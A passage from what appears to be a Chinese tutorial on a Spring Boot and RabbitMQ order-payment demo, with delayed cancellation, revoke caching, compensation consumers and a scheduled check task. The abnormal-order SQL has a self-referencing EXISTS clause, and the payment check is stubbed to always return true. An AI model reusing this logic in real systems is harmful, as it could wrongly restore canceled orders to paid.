<span class="hljs-meta">@Slf4j</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-meta">@RequiredArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCancelService</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> TOrderMapper orderMapper;

    <span class="hljs-comment">/**
     * 取消订单（乐观锁：防止并发修改）
     */</span>
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> boolean cancelOrder(<span class="hljs-built_in">Long</span> orderId) {
        <span class="hljs-comment">// 1. 乐观锁取消：仅当订单为待支付状态时取消</span>
        int affectRows = orderMapper.cancelOrder(orderId, TOrder.StatusEnum.UNPAID.getCode());
        <span class="hljs-keyword">if</span> (affectRows &gt; <span class="hljs-number">0</span>) {
            log.info(<span class="hljs-string">"订单取消成功 | 订单ID：{}"</span>, orderId);
            <span class="hljs-comment">// 2. 释放库存/优惠券等操作（模拟）</span>
            releaseResource(orderId);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        } <span class="hljs-keyword">else</span> {
            log.warn(<span class="hljs-string">"订单取消失败（状态非待支付）| 订单ID：{}"</span>, orderId);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
    }

    <span class="hljs-comment">/**
     * 模拟释放资源（库存/优惠券）
     */</span>
    <span class="hljs-keyword">private</span> void releaseResource(<span class="hljs-built_in">Long</span> orderId) {
        log.info(<span class="hljs-string">"释放订单关联资源 | 订单ID：{}"</span>, orderId);
    }
}
</code></pre>
<h4 data-id="heading-18">6. 消息消费者</h4>
<h5 data-id="heading-19">（1）反向撤销指令消费者（OrderCancelRevokeConsumer.java）</h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">package</span> com.example.orderpaydemo.consumer;

<span class="hljs-keyword">import</span> com.github.benmanes.caffeine.cache.Cache;
<span class="hljs-keyword">import</span> com.github.benmanes.caffeine.cache.Caffeine;
<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;
<span class="hljs-keyword">import</span> org.springframework.cloud.stream.<span class="hljs-keyword">annotation</span>.StreamListener;
<span class="hljs-keyword">import</span> org.springframework.messaging.handler.<span class="hljs-keyword">annotation</span>.Payload;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-keyword">import</span> javax.<span class="hljs-keyword">annotation</span>.PostConstruct;
<span class="hljs-keyword">import</span> java.util.concurrent.TimeUnit;

<span class="hljs-comment">/**
 * 反向撤销指令消费者：缓存已支付订单ID，让延迟消息过滤
 */</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCancelRevokeConsumer</span> {
    <span class="hljs-comment">// 本地缓存：已支付订单ID（过期1小时，避免内存溢出）</span>
    <span class="hljs-keyword">private</span> Cache&lt;<span class="hljs-built_in">Long</span>, <span class="hljs-built_in">Boolean</span>&gt; revokedOrderCache;

    <span class="hljs-meta">@PostConstruct</span>
    <span class="hljs-keyword">public</span> void initCache() {
        revokedOrderCache = Caffeine.newBuilder()
                .expireAfterWrite(<span class="hljs-number">1</span>, TimeUnit.HOURS)
                .maximumSize(<span class="hljs-number">100000</span>) <span class="hljs-comment">// 最大缓存10万条</span>
                .recordStats()
                .build();
    }

    <span class="hljs-comment">/**
     * 消费反向撤销指令
     */</span>
    <span class="hljs-meta">@StreamListener(OrderMessageChannels.ORDER_CANCEL_REVOKE_INPUT)</span>
    <span class="hljs-keyword">public</span> void onRevokeMessage(<span class="hljs-meta">@Payload</span> <span class="hljs-built_in">Long</span> orderId) {
        revokedOrderCache.put(orderId, <span class="hljs-literal">true</span>);
        log.info(<span class="hljs-string">"反向撤销指令生效 | 订单ID：{} 已加入缓存"</span>, orderId);
    }

    <span class="hljs-comment">/**
     * 判断订单是否需要撤销取消操作
     */</span>
    <span class="hljs-keyword">public</span> boolean isOrderRevoked(<span class="hljs-built_in">Long</span> orderId) {
        <span class="hljs-keyword">return</span> revokedOrderCache.getIfPresent(orderId) != <span class="hljs-literal">null</span>;
    }

    <span class="hljs-comment">// 提供缓存访问（补偿任务用）</span>
    <span class="hljs-keyword">public</span> Cache&lt;<span class="hljs-built_in">Long</span>, <span class="hljs-built_in">Boolean</span>&gt; getRevokedOrderCache() {
        <span class="hljs-keyword">return</span> revokedOrderCache;
    }
}
</code></pre>
<h5 data-id="heading-20">（2）延迟取消消息消费者（OrderDelayCancelConsumer.java）</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.orderpaydemo.consumer;

<span class="hljs-keyword">import</span> com.example.orderpaydemo.service.OrderCancelService;
<span class="hljs-keyword">import</span> lombok.RequiredArgsConstructor;
<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;
<span class="hljs-keyword">import</span> org.springframework.amqp.core.Message;
<span class="hljs-keyword">import</span> org.springframework.cloud.stream.annotation.StreamListener;
<span class="hljs-keyword">import</span> org.springframework.messaging.handler.annotation.Payload;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-keyword">import</span> java.io.IOException;

<span class="hljs-comment">/**
 * 延迟取消消息消费者：核心过滤已撤销订单
 */</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-meta">@RequiredArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderDelayCancelConsumer</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> OrderCancelRevokeConsumer revokeConsumer;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> OrderCancelService cancelService;

    <span class="hljs-comment">/**
     * 消费延迟取消消息
     */</span>
    <span class="hljs-meta">@StreamListener(OrderMessageChannels.ORDER_DELAY_INPUT)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDelayCancelMessage</span><span class="hljs-params">(<span class="hljs-meta">@Payload</span> Long orderId, Message message)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-keyword">try</span> {
            log.info(<span class="hljs-string">"收到延迟取消消息 | 订单ID：{}"</span>, orderId);

            <span class="hljs-comment">// 核心：反向撤销过滤（已支付订单直接忽略）</span>
            <span class="hljs-keyword">if</span> (revokeConsumer.isOrderRevoked(orderId)) {
                log.info(<span class="hljs-string">"反向撤销生效 | 订单ID：{} 已支付，跳过取消"</span>, orderId);
                message.getMessageProperties().getChannel().basicAck(message.getMessageProperties().getDeliveryTag(), <span class="hljs-literal">false</span>);
                <span class="hljs-keyword">return</span>;
            }

            <span class="hljs-comment">// 执行取消订单</span>
            <span class="hljs-type">boolean</span> <span class="hljs-variable">cancelResult</span> <span class="hljs-operator">=</span> cancelService.cancelOrder(orderId);
            <span class="hljs-keyword">if</span> (cancelResult) {
                message.getMessageProperties().getChannel().basicAck(message.getMessageProperties().getDeliveryTag(), <span class="hljs-literal">false</span>);
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// 取消失败，手动NACK（触发重试）</span>
                message.getMessageProperties().getChannel().basicNack(message.getMessageProperties().getDeliveryTag(), <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);
            }
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"延迟取消消息消费异常 | 订单ID：{}"</span>, orderId, e);
            <span class="hljs-comment">// 异常重试</span>
            message.getMessageProperties().getChannel().basicNack(message.getMessageProperties().getDeliveryTag(), <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);
        }
    }
}
</code></pre>
<h5 data-id="heading-21">（3）补偿任务消费者（OrderCompensateConsumer.java）</h5>
<pre><code class="hljs language-scss" lang="scss">package com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.orderpaydemo</span><span class="hljs-selector-class">.consumer</span>;

import com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.orderpaydemo</span><span class="hljs-selector-class">.entity</span><span class="hljs-selector-class">.TLocalMessage</span>;
import com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.orderpaydemo</span><span class="hljs-selector-class">.mapper</span><span class="hljs-selector-class">.TLocalMessageMapper</span>;
import lombok<span class="hljs-selector-class">.RequiredArgsConstructor</span>;
import lombok<span class="hljs-selector-class">.extern</span><span class="hljs-selector-class">.slf4j</span><span class="hljs-selector-class">.Slf4j</span>;
import org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.amqp</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.Message</span>;
import org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.stream</span><span class="hljs-selector-class">.annotation</span><span class="hljs-selector-class">.StreamListener</span>;
import org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.messaging</span><span class="hljs-selector-class">.handler</span><span class="hljs-selector-class">.annotation</span><span class="hljs-selector-class">.Payload</span>;
import org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.stereotype</span><span class="hljs-selector-class">.Component</span>;

import java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.IOException</span>;

<span class="hljs-comment">/**
 * 补偿任务消费者：补做反向撤销操作
 */</span>
<span class="hljs-keyword">@Slf</span>4j
<span class="hljs-keyword">@Component</span>
<span class="hljs-keyword">@RequiredArgsConstructor</span>
public class OrderCompensateConsumer {
    private final TLocalMessageMapper localMessageMapper;
    private final OrderCancelRevokeConsumer revokeConsumer;

    <span class="hljs-comment">/**
     * 消费补偿任务：确保撤销指令生效
     */</span>
    <span class="hljs-keyword">@StreamListener</span>(OrderMessageChannels.ORDER_COMPENSATE_INPUT)
    public void onCompensateMessage(<span class="hljs-keyword">@Payload</span> Long orderId, Message message) throws IOException {
        try {
            log<span class="hljs-selector-class">.info</span>("收到补偿任务 | 订单ID：{}", orderId);

            <span class="hljs-comment">// 1. 查询本地消息（加锁更新为处理中）</span>
            TLocalMessage localMessage = localMessageMapper<span class="hljs-selector-class">.selectOne</span>(
                    com.baomidou.mybatisplus.core.conditions.query.QueryWrapper.&lt;TLocalMessage&gt;lambda()
                            <span class="hljs-selector-class">.eq</span>(TLocalMessage::getBusinessId, orderId)
                            <span class="hljs-selector-class">.eq</span>(TLocalMessage::getMessageType, TLocalMessage.TYPE_ORDER_PAY_CANCEL_DELAY)
                            <span class="hljs-selector-class">.eq</span>(TLocalMessage::getStatus, TLocalMessage.STATUS_PENDING)
            );

            if (localMessage == null) {
                log<span class="hljs-selector-class">.warn</span>("本地消息不存在 | 订单ID：{}", orderId);
                message<span class="hljs-selector-class">.getMessageProperties</span>()<span class="hljs-selector-class">.getChannel</span>()<span class="hljs-selector-class">.basicAck</span>(message.getMessageProperties()<span class="hljs-selector-class">.getDeliveryTag</span>(), false);
                return;
            }

            <span class="hljs-comment">// 2. 加锁更新消息状态为处理中</span>
            int lockRows = localMessageMapper<span class="hljs-selector-class">.updateStatus</span>(
                    localMessage.getId(),
                    TLocalMessage<span class="hljs-selector-class">.STATUS_PENDING</span>,
                    TLocalMessage<span class="hljs-selector-class">.STATUS_PROCESSING</span>
            );
            if (lockRows == <span class="hljs-number">0</span>) {
                log<span class="hljs-selector-class">.warn</span>("本地消息已被处理 | 消息ID：{} | 订单ID：{}", localMessage.getId(), orderId);
                message<span class="hljs-selector-class">.getMessageProperties</span>()<span class="hljs-selector-class">.getChannel</span>()<span class="hljs-selector-class">.basicAck</span>(message.getMessageProperties()<span class="hljs-selector-class">.getDeliveryTag</span>(), false);
                return;
            }

            <span class="hljs-comment">// 3. 补做反向撤销：强制存入缓存</span>
            revokeConsumer<span class="hljs-selector-class">.getRevokedOrderCache</span>()<span class="hljs-selector-class">.put</span>(orderId, true);
            log<span class="hljs-selector-class">.info</span>("补偿任务执行成功 | 订单ID：{} 已补做撤销", orderId);

            <span class="hljs-comment">// 4. 更新消息状态为已完成</span>
            localMessageMapper<span class="hljs-selector-class">.updateStatus</span>(
                    localMessage.getId(),
                    TLocalMessage<span class="hljs-selector-class">.STATUS_PROCESSING</span>,
                    TLocalMessage<span class="hljs-selector-class">.STATUS_COMPLETED</span>
            );

            <span class="hljs-comment">// 5. 手动ACK</span>
            message<span class="hljs-selector-class">.getMessageProperties</span>()<span class="hljs-selector-class">.getChannel</span>()<span class="hljs-selector-class">.basicAck</span>(message.getMessageProperties()<span class="hljs-selector-class">.getDeliveryTag</span>(), false);
        } catch (Exception e) {
            log<span class="hljs-selector-class">.error</span>("补偿任务执行异常 | 订单ID：{}", orderId, e);
            <span class="hljs-comment">// 重试次数+1</span>
            <span class="hljs-built_in">updateRetryCount</span>(orderId);
            <span class="hljs-comment">// 手动NACK（触发重试）</span>
            message<span class="hljs-selector-class">.getMessageProperties</span>()<span class="hljs-selector-class">.getChannel</span>()<span class="hljs-selector-class">.basicNack</span>(message.getMessageProperties()<span class="hljs-selector-class">.getDeliveryTag</span>(), false, true);
        }
    }

    <span class="hljs-comment">/**
     * 更新重试次数
     */</span>
    private void <span class="hljs-built_in">updateRetryCount</span>(Long orderId) {
        TLocalMessage localMessage = localMessageMapper<span class="hljs-selector-class">.selectOne</span>(
                com.baomidou.mybatisplus.core.conditions.query.QueryWrapper.&lt;TLocalMessage&gt;lambda()
                        <span class="hljs-selector-class">.eq</span>(TLocalMessage::getBusinessId, orderId)
                        <span class="hljs-selector-class">.eq</span>(TLocalMessage::getMessageType, TLocalMessage.TYPE_ORDER_PAY_CANCEL_DELAY)
        );
        if (localMessage != null) {
            int newRetryCount = localMessage<span class="hljs-selector-class">.getRetryCount</span>() + <span class="hljs-number">1</span>;
            localMessageMapper<span class="hljs-selector-class">.updateRetryCount</span>(localMessage.getId(), newRetryCount);
            log<span class="hljs-selector-class">.warn</span>("补偿任务重试次数+<span class="hljs-number">1</span> | 消息ID：{} | 重试次数：{}", localMessage.getId(), newRetryCount);
        }
    }
}
</code></pre>
<h5 data-id="heading-22">（4）补偿任务死信消费者（OrderCompensateDlqConsumer.java）</h5>
<pre><code class="hljs language-typescript" lang="typescript">package com.<span class="hljs-property">example</span>.<span class="hljs-property">orderpaydemo</span>.<span class="hljs-property">consumer</span>;

<span class="hljs-keyword">import</span> lombok.<span class="hljs-property">extern</span>.<span class="hljs-property">slf4j</span>.<span class="hljs-property">Slf4j</span>;
<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">amqp</span>.<span class="hljs-property">rabbit</span>.<span class="hljs-property">annotation</span>.<span class="hljs-property">RabbitListener</span>;
<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">stereotype</span>.<span class="hljs-property">Component</span>;

<span class="hljs-comment">/**
 * 补偿任务死信消费者：重试失败后告警+人工介入
 */</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCompensateDlqConsumer</span> {
    <span class="hljs-comment">/**
     * 消费补偿任务死信队列
     */</span>
    <span class="hljs-meta">@RabbitListener</span>(queues = <span class="hljs-string">"order.compensate.dlq"</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">onCompensateDlqMessage</span>(<span class="hljs-params">Long orderId</span>) {
        <span class="hljs-comment">// 1. 发送告警（钉钉/邮件/短信，模拟）</span>
        <span class="hljs-title function_">sendAlarm</span>(orderId);

        <span class="hljs-comment">// 2. 标记本地消息为失败</span>
        <span class="hljs-title function_">markMessageFailed</span>(orderId);

        log.<span class="hljs-title function_">error</span>(<span class="hljs-string">"补偿任务重试失败，进入死信队列 | 订单ID：{} 需人工介入"</span>, orderId);
    }

    <span class="hljs-comment">/**
     * 模拟发送告警
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">sendAlarm</span>(<span class="hljs-params">Long orderId</span>) {
        log.<span class="hljs-title function_">warn</span>(<span class="hljs-string">"【告警】补偿任务失败 | 订单ID：{}"</span>, orderId);
        <span class="hljs-comment">// 实际项目中替换为真实告警逻辑（如钉钉机器人、企业微信）</span>
    }

    <span class="hljs-comment">/**
     * 标记本地消息为失败
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">markMessageFailed</span>(<span class="hljs-params">Long orderId</span>) {
        <span class="hljs-comment">// 实际项目中更新本地消息表状态为失败</span>
        log.<span class="hljs-title function_">info</span>(<span class="hljs-string">"标记本地消息为失败 | 订单ID：{}"</span>, orderId);
    }
}
</code></pre>
<h4 data-id="heading-23">7. 异常兜底定时任务（OrderAbnormalCheckTask.java）</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.orderpaydemo.task;

<span class="hljs-keyword">import</span> com.example.orderpaydemo.entity.TOrder;
<span class="hljs-keyword">import</span> com.example.orderpaydemo.mapper.TOrderMapper;
<span class="hljs-keyword">import</span> com.example.orderpaydemo.service.OrderCancelService;
<span class="hljs-keyword">import</span> lombok.RequiredArgsConstructor;
<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;
<span class="hljs-keyword">import</span> org.springframework.scheduling.annotation.Scheduled;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-comment">/**
 * 异常订单校验：兜底所有异常场景
 */</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-meta">@RequiredArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderAbnormalCheckTask</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> TOrderMapper orderMapper;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> OrderCancelService cancelService;

    <span class="hljs-comment">/**
     * 定时校验异常订单（每5分钟执行）
     */</span>
    <span class="hljs-meta">@Scheduled(fixedRateString = "${order.compensate.check-interval}000")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkAbnormalOrders</span><span class="hljs-params">()</span> {
        log.info(<span class="hljs-string">"开始校验异常订单"</span>);

        <span class="hljs-comment">// 1. 查询异常订单（已支付被取消/待支付超时未取消）</span>
        List&lt;TOrder&gt; abnormalOrders = orderMapper.listAbnormalOrders(
                Integer.parseInt(System.getProperty(<span class="hljs-string">"order.pay.expire-minutes"</span>, <span class="hljs-string">"5"</span>))
        );

        <span class="hljs-keyword">if</span> (abnormalOrders.isEmpty()) {
            log.info(<span class="hljs-string">"无异常订单"</span>);
            <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-comment">// 2. 处理异常订单</span>
        <span class="hljs-keyword">for</span> (TOrder order : abnormalOrders) {
            <span class="hljs-type">Long</span> <span class="hljs-variable">orderId</span> <span class="hljs-operator">=</span> order.getId();
            <span class="hljs-comment">// 场景1：已支付但被取消 → 恢复状态</span>
            <span class="hljs-keyword">if</span> (TOrder.StatusEnum.CANCELED.getCode().equals(order.getStatus())
                    &amp;&amp; hasPayRecord(orderId)) {
                recoverOrderStatus(orderId);
            }
            <span class="hljs-comment">// 场景2：待支付超时未取消 → 强制取消</span>
            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (TOrder.StatusEnum.UNPAID.getCode().equals(order.getStatus())) {
                cancelService.cancelOrder(orderId);
            }
        }

        log.info(<span class="hljs-string">"异常订单校验完成 | 处理数量：{}"</span>, abnormalOrders.size());
    }

    <span class="hljs-comment">/**
     * 模拟查询支付记录
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasPayRecord</span><span class="hljs-params">(Long orderId)</span> {
        <span class="hljs-comment">// 实际项目中查询支付系统记录</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }

    <span class="hljs-comment">/**
     * 恢复已支付但被取消的订单状态
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">recoverOrderStatus</span><span class="hljs-params">(Long orderId)</span> {
        <span class="hljs-type">TOrder</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TOrder</span>();
        order.setId(orderId);
        order.setStatus(TOrder.StatusEnum.PAID.getCode());
        orderMapper.updateById(order);
        log.warn(<span class="hljs-string">"恢复异常订单状态 | 订单ID：{}"</span>, orderId);
    }
}
</code></pre>
<h4 data-id="heading-24">8. 启动类（OrderPayDemoApplication.java）</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">package</span> com.example.orderpaydemo;

<span class="hljs-keyword">import</span> org.mybatis.spring.<span class="hljs-keyword">annotation</span>.MapperScan;
<span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;
<span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;
<span class="hljs-keyword">import</span> org.springframework.scheduling.<span class="hljs-keyword">annotation</span>.EnableScheduling;

<span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-meta">@MapperScan(<span class="hljs-string">"com.example.orderpaydemo.mapper"</span>)</span>
<span class="hljs-meta">@EnableScheduling</span> <span class="hljs-comment">// 开启定时任务</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderPayDemoApplication</span> {
    <span class="hljs-keyword">public</span> static void main(String[] args) {
        SpringApplication.run(OrderPayDemoApplication.<span class="hljs-keyword">class</span>, args);
    }
}
</code></pre>
<h4 data-id="heading-25">9. Mapper XML（可选，补充自定义SQL）</h4>
<h5 data-id="heading-26">（1）TOrderMapper.xml</h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span>?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">"-//mybatis.org//DTD Mapper 3.0//EN"</span> <span class="hljs-string">"http://mybatis.org/dtd/mybatis-3-mapper.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">"com.example.orderpaydemo.mapper.TOrderMapper"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 取消订单（乐观锁） --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">update</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"cancelOrder"</span>&gt;</span>
        UPDATE t_order
        SET status = 2, update_time = NOW()
        WHERE id = #{id} AND status = #{oldStatus}
    <span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- 查询异常订单 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"listAbnormalOrders"</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">"com.example.orderpaydemo.entity.TOrder"</span>&gt;</span>
        SELECT * FROM t_order
        WHERE (status = 2 AND EXISTS (SELECT 1 FROM t_order WHERE id = t_order.id AND status = 1))
           OR (status = 0 AND create_time &lt; DATE_SUB(NOW(), INTERVAL #{expireMinutes} MINUTE))
    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span>
</code></pre>
<h5 data-id="heading-27">（2）TLocalMessageMapper.xml</h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span>?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">"-//mybatis.org//DTD Mapper 3.0//EN"</span> <span class="hljs-string">"http://mybatis.org/dtd/mybatis-3-mapper.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">"com.example.orderpaydemo.mapper.TLocalMessageMapper"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 更新消息状态 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">update</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"updateStatus"</span>&gt;</span>
        UPDATE t_local_message
        SET status = #{newStatus}, update_time = NOW()
        WHERE id = #{id} AND status = #{oldStatus}
    <span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- 更新重试次数 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">update</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"updateRetryCount"</span>&gt;</span>
        UPDATE t_local_message
        SET retry_count = #{retryCount}, update_time = NOW()
        WHERE id = #{id}
    <span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- 查询待处理消息 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"listPendingMessages"</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">"com.example.orderpaydemo.entity.TLocalMessage"</span>&gt;</span>
        SELECT * FROM t_local_message
        WHERE status IN (0, 1) AND retry_count &lt; #{maxRetryCount}
    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span>
</code></pre>
<h3 data-id="heading-28">四、测试验证步骤</h3>
<h4 data-id="heading-29">1. 环境准备</h4>
<ul>
<li>启动RabbitMQ（本地/docker）；</li>
<li>启动项目（自动创建H2内存表）；</li>
<li>访问H2控制台：<a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A8080%2Fh2-console%25EF%25BC%258CJDBC" target="_blank" title="http://localhost:8080/h2-console%EF%BC%8CJDBC" ref="nofollow noopener noreferrer">http://localhost:8080/h2-console，JDBC</a> URL填<code>jdbc:h2:mem:order-pay-db</code>，用户名<code>sa</code>，密码空，连接后可查看表结构。</li>
</ul>
<h4 data-id="heading-30">2. 测试正常流程</h4>
<h5 data-id="heading-31">（1）创建订单</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 可通过Test类/Controller调用</span>
<span class="hljs-meta">@SpringBootTest</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderPayDemoApplicationTests</span> {
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderCreateService orderCreateService;
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderPayService orderPayService;

    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">testNormalPay</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 1. 创建订单（用户ID：1，金额：100元）</span>
        <span class="hljs-type">Long</span> <span class="hljs-variable">orderId</span> <span class="hljs-operator">=</span> orderCreateService.createOrder(<span class="hljs-number">1L</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"100.00"</span>));

        <span class="hljs-comment">// 2. 模拟支付成功，调用回调</span>
        orderPayService.handlePayCallback(orderId);

        <span class="hljs-comment">// 3. 5分钟后查看延迟消息消费日志：会过滤该订单，不取消</span>
        <span class="hljs-comment">// 4. 查看H2表t_order：status=1（已支付）</span>
        <span class="hljs-comment">// 5. 查看t_local_message：status=2（已完成）</span>
    }
}
</code></pre>
<h4 data-id="heading-32">3. 测试异常流程（回调重试）</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Test</span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">testCallbackRetry</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 1. 创建订单</span>
    <span class="hljs-type">Long</span> <span class="hljs-variable">orderId</span> <span class="hljs-operator">=</span> orderCreateService.createOrder(<span class="hljs-number">2L</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"200.00"</span>));

    <span class="hljs-comment">// 2. 添加回调重试任务（模拟支付系统回调失败）</span>
    orderPayService.addCallbackRetryTask(orderId);

    <span class="hljs-comment">// 3. 等待60秒后，查看日志：会自动重试回调，直到成功</span>
    <span class="hljs-comment">// 4. 若重试3次失败，会触发退款：t_order.status=3（已退款）</span>
}
</code></pre>
<h4 data-id="heading-33">4. 测试补偿任务（撤销指令发送失败）</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Test</span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">testCompensateTask</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 1. 创建订单</span>
    <span class="hljs-type">Long</span> <span class="hljs-variable">orderId</span> <span class="hljs-operator">=</span> orderCreateService.createOrder(<span class="hljs-number">3L</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"300.00"</span>));

    <span class="hljs-comment">// 2. 手动调用支付回调（模拟撤销指令发送失败）</span>
    orderPayService.handlePayCallback(orderId);

    <span class="hljs-comment">// 3. 查看补偿任务日志：会补做撤销操作，将订单ID存入缓存</span>
    <span class="hljs-comment">// 4. 延迟消息消费时，仍会过滤该订单</span>
}
</code></pre>
<h3 data-id="heading-34">五、核心总结</h3>
<ol>
